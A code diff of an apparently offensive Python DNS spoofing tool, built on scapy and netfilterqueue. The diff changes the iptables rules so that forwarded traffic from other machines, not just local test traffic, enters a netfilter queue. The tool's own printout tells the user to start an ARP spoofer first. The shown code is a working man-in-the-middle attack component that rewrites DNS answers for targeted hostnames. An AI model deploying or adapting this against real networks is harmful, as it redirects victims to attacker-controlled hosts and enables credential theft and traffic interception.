@@ -25,6 +25,9 @@ def process_packet(packet):
             print("[+] Intercept request for ====> " , query.decode())
             print(scapy_packet.summary())
      
+            # print("query ", query)
+            # print("dns Hosts", dns_hosts)
+
             if query in dns_hosts :
                 print(f"[*]Spoofing URl For ",query.decode())
                 print("[*] Before Modification")
@@ -52,12 +55,12 @@ def process_packet(packet):
 def define_queue_iptable():
     queue_number = "99"
     subprocess.run("iptables --flush", check=True, shell=True)
-    # subprocess.call(["sudo", "iptables","-I","FORWARD","-j","NFQUEUE","--queue-num", queue_number])
+    subprocess.call(["sudo", "iptables","-I","FORWARD","-j","NFQUEUE","--queue-num", queue_number])
 
     # # packet from the local machine will not go in this chain ,they will only go in the queue if they are comming from the remote computer
     # # for testing his on local host uncomment the below two commands
-    subprocess.call(["iptables","-I","OUTPUT","-j","NFQUEUE","--queue-num",queue_number])
-    subprocess.call(["iptables","-I","INPUT","-j","NFQUEUE","--queue-num",queue_number])
+    # subprocess.call(["iptables","-I","OUTPUT","-j","NFQUEUE","--queue-num",queue_number])
+    # subprocess.call(["iptables","-I","INPUT","-j","NFQUEUE","--queue-num",queue_number])
 
     # binding the queue to the nerfilter queue
     queue = netfilterqueue.NetfilterQueue()
@@ -76,8 +79,7 @@ def add_host_in_list():
     for x in URl:
         temp = bytes( x + ".", 'utf-8')
         dns_hosts.append(temp)
-    print(f"[*] Spoofing url ==> ")
-    print(f"{dns_hosts}")
+    print(f"[*] Spoofing url ==> ", dns_hosts)
 
 
 def redirect_data():
@@ -104,8 +106,8 @@ def start_spoofing():
     print(f"Welcome To DNS Spoofer")
     try:
         print(f"[***] Please Start Arp Spoofer Before Using this Module [***]")
-        redirect_data()
         add_host_in_list()
+        redirect_data()
         print(f"[++] Intercepting requests .... [++]")
         #call the main program
         define_queue_iptable()
